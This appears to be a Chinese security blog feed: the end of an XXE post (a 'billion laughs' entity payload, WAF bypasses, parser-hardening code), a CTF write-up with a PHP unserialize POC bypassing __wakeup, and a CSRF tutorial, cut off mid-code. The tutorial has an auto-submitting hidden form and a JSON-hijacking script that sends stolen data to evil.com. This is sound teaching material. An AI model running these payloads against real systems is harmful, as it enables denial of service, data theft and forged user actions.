lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;     ]&gt;     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><h2 id="JSON-content-type-XXE"><a href="#JSON-content-type-XXE" class="headerlink" title="JSON content-type XXE"></a><strong>JSON content-type XXE</strong></h2><p>尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p><p>简单来说,就是修改HTTP请求头中的content-type 中的 application/json 改为application/xml  然后请求的时候发送恶意的xml数据</p><h1 id="0x05-XXE绕过"><a href="#0x05-XXE绕过" class="headerlink" title="0x05  XXE绕过"></a>0x05  XXE绕过</h1><p>下面的方法是用于绕过WAF的</p><h2 id="方法1：文档中的额外空格"><a href="#方法1：文档中的额外空格" class="headerlink" title="方法1：文档中的额外空格"></a>方法1：文档中的额外空格</h2><p>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<code>或</code>中插入额外的空格，从而绕过此类WAF。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190206172823-8c9330fe-29f1-1.png" alt></p><h2 id="方法2：格式无效"><a href="#方法2：格式无效" class="headerlink" title="方法2：格式无效"></a>方法2：格式无效</h2><p>发送特殊格式的XML文档,使WAF认为无效</p><p><strong>链接到未知的实体</strong></p><blockquote><p>比较成熟的WAF设置通常不会读取链接文件的内容。这种策略通常是有意义的，否则，WAF本身也可能成为攻击的目标。问题是，外部资源的链接不仅可以存在于文档的第三部分（正文），还可以存在于声明&lt;! DOCTYPE&gt;中 。<br>这意味着未读取文件内容的WAF将不会读取文档中实体的声明。而指向未知实体的链接又会阻止XML解析器导致错误。</p></blockquote><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190206173249-2af53300-29f2-1.png" alt></p><h2 id="方法3-外来编码（Exotic-encodings）"><a href="#方法3-外来编码（Exotic-encodings）" class="headerlink" title="方法3:外来编码（Exotic encodings）"></a>方法3:外来编码（Exotic encodings）</h2><p>除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。<br>更多信息：<a href="https://www.w3.org/TR/xml/#sec-guessing" target="_blank" rel="noopener">https://www.w3.org/TR/xml/#sec-guessing</a><br>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。<br>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。<br>外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</p><h2 id="方法4：在一个文档中使用两种类型的编码"><a href="#方法4：在一个文档中使用两种类型的编码" class="headerlink" title="方法4：在一个文档中使用两种类型的编码"></a>方法4：在一个文档中使用两种类型的编码</h2><p>在上一节中，我们演示了文档的编码通常由其第一个字节指定。但是当包含编码属性的<?xml?>标记引用文档开头的不同字符集时会发生什么？在这种情况下，一些解析器更改编码，使文件的开头有一组字符，其余的是另一组编码。。也就是说，不同的解析器可能在不同的时间转换编码。Java解析器(javax.xml.parsers)在<?xml?>结束后严格地更改字符集，而libxml2解析器可以在执行“编码”属性的值之后或在处理<?xml?>之前或之后切换编码。<br>只有在根本不处理这些文件时，比较成熟的WAF才能可靠地防止这些文件中的攻击。我们还必须记住，有许多同义词编码，例如UTF-32BE和UCS-4BE。此外，有些编码可能不同，但从编码文档初始部分 <code>的角度来看，它们是兼容的。例如，看似UTF-8的文档可能包含字符串</code>。<br>这里有一些例子。为了简明扼要，我们不把XXE放在文档里。<br>libxml2解析器将文档视为有效，但是，javax.xml.parsers set中的Java引擎认为它无效：</p><h1 id="0x06-XXE防御"><a href="#0x06-XXE防御" class="headerlink" title="0x06  XXE防御"></a>0x06  XXE防御</h1><h2 id="使用语言中推荐的禁用外部实体的方法"><a href="#使用语言中推荐的禁用外部实体的方法" class="headerlink" title="使用语言中推荐的禁用外部实体的方法"></a><strong>使用语言中推荐的禁用外部实体的方法</strong></h2><p><strong>PHP：</strong></p><pre><code>libxml_disable_entity_loader(true);</code></pre><p><strong>JAVA:</strong></p><pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false).setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</code></pre><p><strong>Python：</strong></p><pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h2 id="手动黑名单过滤-不推荐"><a href="#手动黑名单过滤-不推荐" class="headerlink" title="手动黑名单过滤(不推荐)"></a><strong>手动黑名单过滤(不推荐)</strong></h2><p>过滤关键词：</p><pre><code>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</code></pre><h1 id="0x07-XXE挖掘"><a href="#0x07-XXE挖掘" class="headerlink" title="0x07  XXE挖掘"></a>0x07  XXE挖掘</h1><ol><li>检测XML是否会被正常解析</li><li>检测服务器是否支持DTD引用外部实体</li><li>测试回显或者盲注</li></ol><p>如果以上两个条件都满足,那么就有可能存在XXE漏洞的</p><p>白盒下:  </p><ol><li>审计是否导入并使用官方或第三方XML解析器</li><li>审计是否对XML解析器进行安全配置</li><li>审计被解析的XML文档数据是否<strong>可控</strong></li></ol><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08  总结"></a>0x08  总结</h1><p>XXE这个点的话,先理解原理和挖掘思路,再对利用方法多进行实操就应该差不多了. </p><p>以上笔记应该反复看,反复出心得,并不断更新</p><h1 id="0x09-参考资料"><a href="#0x09-参考资料" class="headerlink" title="0x09  参考资料"></a>0x09  参考资料</h1><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/#%E4%BA%8C%E3%80%81%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86%EF%BC%9A" target="_blank" rel="noopener">一篇文章带你理解漏洞之 XXE 漏洞</a></p><p><a href="https://xz.aliyun.com/t/4059" target="_blank" rel="noopener">绕过WAF保护的XXE</a></p><p><a href="https://mabin004.github.io/2018/07/03/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/" target="_blank" rel="noopener">XXE漏洞攻击和防御</a></p><p><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">XXE漏洞攻防之我见</a></p><p><a href="https://zhuanlan.zhihu.com/p/31629438" target="_blank" rel="noopener">十分钟带你了解XXE</a></p><p><a href="https://xz.aliyun.com/t/5860" target="_blank" rel="noopener">一次Blind-XXE漏洞挖掘之旅</a></p><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行</a></p><p><a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a></p><p><a href="https://xz.aliyun.com/t/122#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/122#toc-0</a></p><p><a href="https://p0rz9.github.io/2019/02/27/xxe/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/02/27/xxe/</a></p><p><a href="https://baike.baidu.com/item/OOB/1828538" target="_blank" rel="noopener">https://baike.baidu.com/item/OOB/1828538</a></p><p><a href="https://cloud.tencent.com/developer/article/1079593" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1079593</a></p><p><strong><em>Stop managing your time. Start managing your focus.</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
            <tag> XML </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web_php_unserialize引起的思考</title>
      <link href="/posts/20200108/"/>
      <url>/posts/20200108/</url>
      
        <content type="html"><![CDATA[<p>先放出解题POC</p><pre class=" language-PHP"><code class="language-PHP"><?phpclass Demo {     private $file = 'index.php'; //private类型的成员变量    public function __construct($file) {  // 为file赋初值        $this->file = $file;     }    function __destruct() { //反序列化结束后,调用        echo @highlight_file($this->file, true);     }    function __wakeup() { // 绕过__wakeup        if ($this->file != 'index.php') {             //the secret is in the fl4g.php            $this->file = 'index.php';         }     } }$a = new Demo('fl4g.php');  $b = serialize($a);// 下面这段代码是重点$b = str_replace('O:4','O:+4',$b);$b = str_replace(':1:',':2:',$b);echo (base64_encode($b));?></code></pre><a id="more"></a>题目代码<pre class=" language-PHP"><code class="language-PHP"> <?php class Demo {     private $file = 'index.php'; //private类型的成员变量    public function __construct($file) {  // 为file赋初值        $this->file = $file;     }    function __destruct() { //反序列化结束后,调用        echo @highlight_file($this->file, true);     }    function __wakeup() { // 绕过__wakeup        if ($this->file != 'index.php') {             //the secret is in the fl4g.php            $this->file = 'index.php';         }     } }if (isset($_GET['var'])) {  // 提供了GET参数为var    $var = base64_decode($_GET['var']); // 对GET到的var先进行base64解码    if (preg_match('/[oc]:\d+:/i', $var)) {  // 正则匹配/d 匹配数字,匹配oc,不区分大小写,也就是匹配 "o或者c:数字:"        die('stop hacking!');     } else {        @unserialize($var); //如果匹配不成功对var进行反序列化,现在很明确了,就是将payload base64打过去就行了.    } } else {     highlight_file("index.php"); } ?></code></pre><p>一般情况下,遇到反序列化中的private类型的成员变量,在进行反序列化时,将得到的payload中的<strong>类名前后加上%00</strong>就能成功打到flag</p><p>在CTF tools里base64encode就不行</p><p>绕过__wakeup 也非常简单</p><p>CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>但是这道题就不行,这道题目必须在PHP脚本里面对其进行base64encode</p><p>具体原因,后面有空,深入研究?其实我觉得就是编码问题</p><p>%00不会被当做特殊字符对待</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习CSRF漏洞</title>
      <link href="/posts/20200107/"/>
      <url>/posts/20200107/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>CSRF,即跨站请求伪造</p><p>OWASP于2007年将CSRF归类进 OWASP TOP 10安全风险中,虽然年代久远,但是还是值得学习</p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><a id="more"></a><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>cookie分为<strong>内存cookie和本地cookie</strong></p><p>内存cookie</p><blockquote><p>指的是没有设置有效时间的Cookie，默认的情况下只要关闭了浏览器，Cookie也会被销毁。（Cookie存在于浏览器的内存中，当关闭了浏览器Cookie就销毁了）。</p></blockquote><p>本地cookie</p><blockquote><p>指的是有有效时间的Cookie，这种Cookie的内容不是保存在浏览器的内存中，将Cookie的内容保存（持久化）到硬盘上。这个时候，关闭浏览器，再次打开浏览器会加载硬盘上的文件，从而Cookie中的数据就不会丢失。</p></blockquote><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><a href="https://www.w3cschool.cn/json/" target="_blank" rel="noopener">JSON学习</a></p><p>JSON是JavaScript Object Notation(对象表示方法)的缩写，它是一种数据交换格式并且是超轻量级的数据交换格式。JSON具有自我描述性,更易理解.JSON并非编程语言</p><p>JSON数据类型</p><ul><li>number：和JavaScript的<code>number</code>完全一致；</li><li>boolean：就是JavaScript的<code>true</code>或<code>false</code>；</li><li>string：就是JavaScript的<code>string</code>；</li><li>null：就是JavaScript的<code>null</code>；</li><li>array：就是JavaScript的<code>Array</code>表示方式——<code>[]</code>；</li><li>object：就是JavaScript的<code>{ ... }</code>表示方式。</li></ul><p>以上的数据类型可以任意组合,此外JSON规定了字符集必须是<strong>UTF-8</strong>,并且<strong>字符串规定必须使用双引号” “,Object的键也必须使用双引号</strong></p><p>把任何JavaScript对象变成JSON，就是把这个对象序列化成一个JSON格式的字符串，这样才能够通过网络传递给其他计算机。</p><p>如果我们收到一个JSON格式的字符串，只需要把它反序列化成一个JavaScript对象，就可以在JavaScript中直接使用这个对象了。</p><p>基本语法</p><ul><li>数据使用名/值对表示。</li><li>使用大括号保存对象，每个名称后面跟着一个 ‘:’（冒号），名/值对使用 ,（逗号）分割。</li><li>使用方括号保存数组，数组值使用 ,（逗号）分割。</li></ul><p>JSON对象是在花括号{}中的,JSON数组是在[]中的</p><pre class=" language-json"><code class="language-json">var json-object-name = <span class="token punctuation">{</span> string <span class="token operator">:</span> number_value<span class="token punctuation">,</span> .......<span class="token punctuation">}</span></code></pre><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"book"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"01"</span><span class="token punctuation">,</span>            <span class="token property">"language"</span><span class="token operator">:</span> <span class="token string">"Java"</span><span class="token punctuation">,</span>            <span class="token property">"edition"</span><span class="token operator">:</span> <span class="token string">"third"</span><span class="token punctuation">,</span>            <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"Herbert Schildt"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            <span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"07"</span><span class="token punctuation">,</span>            <span class="token property">"language"</span><span class="token operator">:</span> <span class="token string">"C++"</span><span class="token punctuation">,</span>            <span class="token property">"edition"</span><span class="token operator">:</span> <span class="token string">"second"</span><span class="token punctuation">,</span>            <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"E.Balagurusamy"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>JSON字典格式)</p><pre><code>{&quot;id&quot;:1,&quot;name&quot;: &quot;IFONLY&quot;,&quot;email&quot;:&quot;ifonly_go2019@163.com&quot;}</code></pre><p>列表模式)</p><p>[“foo”,”xoo”,”coo”]</p><h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p><a href="https://www.w3school.com.cn/ajax/index.asp" target="_blank" rel="noopener">Ajax学习</a></p><h3 id="Ajax-简介"><a href="#Ajax-简介" class="headerlink" title="Ajax 简介"></a>Ajax 简介</h3><p>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</p><p>AJAX 不是新的编程语言，而是一种<strong>使用现有标准的新方法。</strong></p><p>AJAX 是<strong>与服务器交换数据</strong>并更新部分网页的艺术，在<strong>不重新加载整个页面的情况下</strong>。</p><p>在 2005 年，Google 通过其 Google Suggest 使 AJAX 变得流行起来。</p><p>Google Suggest 使用 AJAX 创造出动态性极强的 web 界面：当您在谷歌的搜索框输入关键字时，JavaScript 会把这些字符发送到服务器，然后服务器会返回一个搜索建议的列表。</p><h3 id="Ajax-XHR"><a href="#Ajax-XHR" class="headerlink" title="Ajax XHR"></a>Ajax XHR</h3><p>1.创建XMLHttpRequest 对象</p><pre class=" language-js"><code class="language-js">variable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2.向服务器发送请求</p><p>使用XMLHttpRequest 对象的 open()和 send() 方法</p><pre class=" language-JS"><code class="language-JS">xmlhttp.open("GET","shell.php",true);xmlhttp.send();</code></pre><p>open(method,url,async) ,规定请求的类型,URL以及是否异步处理请求</p><ul><li>method: 请求的类型;GET/POST</li><li>url: 文件在服务器上的位置</li><li>async: true(异步)/false(同步)</li></ul><p>GET请求与POST请求相比,GET简单快速,并且在大部分情况下都能用</p><p>但是在下面的情况必须使用POST请求</p><ul><li>无法使用缓存文件</li><li>向服务器发送大量数据,POST没数据限制</li><li>发送包含位置字符的用户输入,POST更稳定可靠</li></ul><p>使用GET方法发送信息,就在URL 中添加信息</p><p>像HTML表单那样POST数据,使用setRequestHeader()来添加HTTP头,并在send()方法中规定发送的数据,举个例子</p><pre class=" language-JS"><code class="language-JS">xmlhttp.open("POST","shell.asp",true);xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");xmlhttp.send("fname=IF&lname=ONLY");</code></pre><p>open()方法的url参数是服务器上文件的地址,该文件是任何类型的文件,比如.txt .xml .php .asp(在传回响应之前,能够在服务器上执行任务)</p><blockquote><p>XMLHttpRequest对象如果要用AJAX,其中open()方法的async参数必须设置为true</p></blockquote><p>3.服务器响应</p><p>使用XMLHttpRequest对象responseText/responeseXML属性</p><p>如果服务器的响应不是XML,就使用responseText属性,该属性以字符串的形式返回</p><pre class=" language-js"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myDiv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span></code></pre><p>当readyState等于4 且状态为 200时,表示响应已就绪</p><p><strong>callback函数</strong></p><p>callback 函数是一种<strong>以参数形式</strong>传递给另一个函数的函数。</p><h1 id="Ox02-什么是CSRF"><a href="#Ox02-什么是CSRF" class="headerlink" title="Ox02  什么是CSRF"></a>Ox02  什么是CSRF</h1><p>CSRF(Cross-site request forgery)是 跨站请求伪造,这个漏洞容易与XSS漏洞混淆.CSRF攻击的发生是由各种请求造成的,对于CSRF来说,该请求有两个关键点: </p><ul><li>跨站点的请求</li><li>请求是伪造的</li></ul><p><img src="https://image.3001.net/images/20171025/15089150893738.png!small" alt></p><p>攻击者盗用了合法用户的身份，以合法用户的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的操作，比如以合法用户的名义发送邮件、发消息，添加系统管理员，甚至于购买商品、虚拟货币转账等。 </p><p>CSRF攻击流程</p><blockquote><p>受害者登录a.com，并保留了登录凭证（Cookie）。</p><p>攻击者引诱受害者访问了b.com。</p><p>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</p><p>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</p><p>a.com以受害者的名义执行了act=xx。</p><p>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</p></blockquote><p>比如删除文章 <a href="http://www.a.com/blog/del?id=1" target="_blank" rel="noopener">www.a.com/blog/del?id=1</a></p><p>如何欺骗</p><ul><li>利用AJAX跨域时带上目标域的会话</li><li>用代码</li></ul><pre class=" language-JS"><code class="language-JS"><img src=http://www.a.com/blog/del?id=1 /></code></pre><ul><li>在<a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 编写一个CSRF页面,欺骗已经登录a网站的用户访问有CSRF的页面</li></ul><p>攻击过程有<strong>三个关键点</strong></p><ul><li>跨域发出GET请求</li><li>可以无javascript参与</li><li>请求是身份认证后的</li></ul><h1 id="0x03-CSRF类型"><a href="#0x03-CSRF类型" class="headerlink" title="0x03  CSRF类型"></a>0x03  CSRF类型</h1><h2 id="GET型-CSRF"><a href="#GET型-CSRF" class="headerlink" title="GET型 CSRF"></a>GET型 CSRF</h2><p>GET型的CSRF就是刚开始举的那个例子</p><p>GET型的CSRF HTTP请求头中,除了请求来源Referer值不一样外,其他都一样,尤其是<strong>cookie</strong> </p><h2 id="POST型-CSRF"><a href="#POST型-CSRF" class="headerlink" title="POST型 CSRF"></a>POST型 CSRF</h2><p>比如网站A的”写文章”功能,这是一个提交表单的操作,就会发起POST请求.这个POST请求可以从网站b发出,通过javascript自动生成一份表单,表单的action地址指向目标网站a的”写文章”表单提交地址</p><p>代码举例(by 余玄)</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">new_form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 创建表单函数</span>    <span class="token keyword">var</span> f <span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"form"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">"POST"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> f<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">create_elements</span><span class="token punctuation">(</span>eForm<span class="token punctuation">,</span>eName<span class="token punctuation">,</span>eValue<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 创建表单项函数,eForm: 表单对象,eName: 表单项,eValue: 表单项值</span>    <span class="token keyword">var</span> e <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    eForm<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span>name <span class="token operator">=</span> eName<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>document<span class="token punctuation">.</span>all<span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>style<span class="token punctuation">.</span>dispaly <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        e<span class="token punctuation">.</span>style<span class="token punctuation">.</span>dispaly <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>        e<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">'0px'</span><span class="token punctuation">;</span>        e<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token string">'0px'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 兼容浏览器的隐藏设置,目的是让表单看不见</span>    e<span class="token punctuation">.</span>value <span class="token operator">=</span> eValue<span class="token punctuation">;</span>    <span class="token keyword">return</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> _f <span class="token operator">=</span> <span class="token function">new_form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建表单对象</span><span class="token function">create_elements</span><span class="token punctuation">(</span>_f<span class="token punctuation">,</span><span class="token string">"title"</span><span class="token punctuation">,</span><span class="token string">"hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建表单项: title=hi</span><span class="token function">create_elements</span><span class="token punctuation">(</span>_f<span class="token punctuation">,</span><span class="token string">"content"</span><span class="token punctuation">,</span><span class="token string">"csrf_here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建表单项: content=csrf_here</span>_f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token string">"http://www.a.com/blog/add"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置表单action提交地址为目标网站a的/blog/add页面</span>_f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//自动提交</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>构造完成后,当a网站的用户被欺骗访问恶意网站b的这个页面时,一个跨域的伪造的POST表单请求就发出了.</p><p>并且携带了a网站用户的cookie</p><h2 id="HTML-CSRF"><a href="#HTML-CSRF" class="headerlink" title="HTML CSRF"></a>HTML CSRF</h2><p>这一类是最普遍的CSRF攻击,能够发起这些请求的HTML元素有: </p><ul><li><code>&lt;link href=&quot;&quot;&gt;</code></li><li><code>&lt;img src=&quot;&quot;&gt;</code></li><li><code>&lt;img lowsrc=&quot;&quot;&gt;</code></li><li><code>&lt;img dynsrc=&quot;&quot;&gt;</code></li><li><code>&lt;meta http-equiv=&quot;refresh&quot; conten=&quot;0;url=&quot;&gt;</code></li><li><code>&lt;iframe src=&quot;&quot;&gt;</code></li><li><code>&lt;frame src=&quot;&quot;&gt;</code></li><li><code>&lt;script src=&quot;&quot;&gt;</code></li><li><code>&lt;bgsound src=&quot;&quot;&gt;</code></li><li><code>&lt;embed src=&quot;&quot;&gt;</code></li><li><code>&lt;video src=&quot;&quot;&gt;</code></li><li><code>&lt;audio src=&quot;&quot;&gt;</code></li><li><code>&lt;a href=&quot;&quot;&gt;</code></li><li><code>&lt;table background=&quot;&quot;&gt;</code></li></ul><p>…</p><p>CSS样式中的: </p><pre class=" language-css"><code class="language-css">@import <span class="token string">""</span><span class="token property">background</span><span class="token punctuation">:</span><span class="token url">url("")</span></code></pre><p>..</p><blockquote><p>还有通过javascript动态生成的标签对象或CSS对象发起的GET请求,而发起POST请求智能通过form提交方式</p></blockquote><h2 id="JSON-HiJacking"><a href="#JSON-HiJacking" class="headerlink" title="JSON HiJacking"></a>JSON HiJacking</h2><p>这种攻击的过程是CSRF,不过是对AJAX响应中最常见的JSON数据类型进行的劫持攻击</p><p>正如前面提到的 callback函数是可以自定义的,自定义一个JSON Hijacking页面,代码如下</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">hijack</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 自定义的劫持函数</span>    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// alert(o[i].text);</span>        data <span class="token operator">+</span><span class="token operator">=</span> o<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sender_id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://www.evil.com/JSONHijacking.php?hi="</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将获取到的隐私睡觉上传到攻击者服务器上</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>api<span class="token punctuation">.</span>a<span class="token 